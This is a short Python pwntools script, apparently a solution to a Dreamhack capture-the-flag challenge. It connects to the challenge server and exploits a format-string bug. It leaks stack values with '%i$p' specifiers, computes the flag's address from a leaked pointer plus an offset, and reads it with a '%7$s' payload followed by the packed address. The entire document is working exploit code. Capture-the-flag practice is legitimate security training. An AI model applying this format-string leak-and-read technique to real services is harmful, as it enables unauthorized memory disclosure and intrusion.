from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 9353
r = remote(HOST, PORT)

def send(payload):
    r.sendlineafter(b'> ', b'2')
    r.sendline(payload)

r.sendlineafter(b'> ', b'1')

def a():
    lst = []
    for i in range(1, 100):
        send(f'%{i}$p'.encode())
        lst.append([i, r.recvline().strip()])
    print(lst)

send(b'%15$p')
flag = int(r.recvline().strip().decode(),16) + 0x2d01
send(b'%7$sAAAA' + p64(flag))

r.interactive()